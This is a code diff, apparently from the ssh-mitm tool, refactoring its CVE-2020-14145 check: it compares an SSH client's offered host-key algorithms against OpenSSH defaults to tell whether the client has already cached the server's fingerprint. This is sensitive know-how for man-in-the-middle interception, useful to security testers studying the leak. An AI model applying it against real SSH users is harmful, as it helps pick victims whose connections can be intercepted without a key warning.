@@ -1,8 +1,11 @@
 import logging
 import re
 
-from paramiko import Transport, common, ECDSAKey
+from paramiko import ECDSAKey
 
+
+CVE = 'CVE-2020-14145'
+CLIENT_NAME = 'openssh'
 DEFAULT_ALGORITMS = [
     [  # client version: OpenSSH_8.2p1 - OpenSSH_8.4p1++
         'ecdsa-sha2-nistp256-cert-v01@openssh.com', 'ecdsa-sha2-nistp384-cert-v01@openssh.com',
@@ -48,36 +51,17 @@ DEFAULT_ALGORITMS = [
 ]
 
 
-def hookup_cve_2020_14145(session):
-    # When really trying to implement connection accepting/forwarding based on CVE-14145
-    # one should consider that clients who already accepted the fingerprint of the ssh-mitm server
-    # will be connected through on their second connect and will get a changed keys error
-    # (because they have a cached fingerprint and it looks like they need to be connected through)
-    def intercept_key_negotiation(transport, m):
-        # restore intercept, to not disturb re-keying if this significantly alters the connection
-        transport._handler_table[common.MSG_KEXINIT] = Transport._negotiate_keys
+def check_key_negotiation(client_version, server_key_algo_list, session):
+    if CLIENT_NAME in client_version:
+        if isinstance(session.proxyserver.host_key, ECDSAKey):
+            logging.warning("%s: ecdsa-sha2 key is a bad choice; this will produce false positives!", CVE)
+        r = re.compile(r".*openssh_(\d\.\d).*", re.IGNORECASE)
+        if int(r.match(session.transport.remote_version).group(1).replace(".", "")) > 83:
+            logging.warning("%s: Remote OpenSSH Version > 8.3; CVE-2020-14145 might produce false positive!", CVE)
 
-        m.get_bytes(16)  # cookie, discarded
-        m.get_list()  # key_algo_list, discarded
-        server_key_algo_list = m.get_list()
-        logging.debug("CVE-2020-14145: client algorithms: %s", server_key_algo_list)
         for host_key_algo in DEFAULT_ALGORITMS:
             if server_key_algo_list == host_key_algo:
-                logging.info("CVE-2020-14145: Client connecting for the FIRST time!")
+                logging.info("%s: Client connecting for the FIRST time!", CVE)
                 break
         else:
-            logging.info("CVE-2020-14145: Client has a locally cached remote fingerprint!")
-        if "openssh" in session.transport.remote_version.lower():
-            if isinstance(session.proxyserver.host_key, ECDSAKey):
-                logging.warning("CVE-2020-14145: ecdsa-sha2 key is a bad choice; this will produce more false "
-                                "positives!")
-            r = re.compile(r".*openssh_(\d\.\d).*", re.IGNORECASE)
-            if int(r.match(session.transport.remote_version).group(1).replace(".", "")) > 83:
-                logging.warning("CVE-2020-14145: Remote OpenSSH Version > 8.3; CVE-2020-14145 might produce false "
-                                "positive!")
-
-        m.rewind()
-        # normal operation
-        Transport._negotiate_keys(transport, m)
-
-    session.transport._handler_table[common.MSG_KEXINIT] = intercept_key_negotiation
+            logging.info("%s: Client has a locally cached remote fingerprint!", CVE)
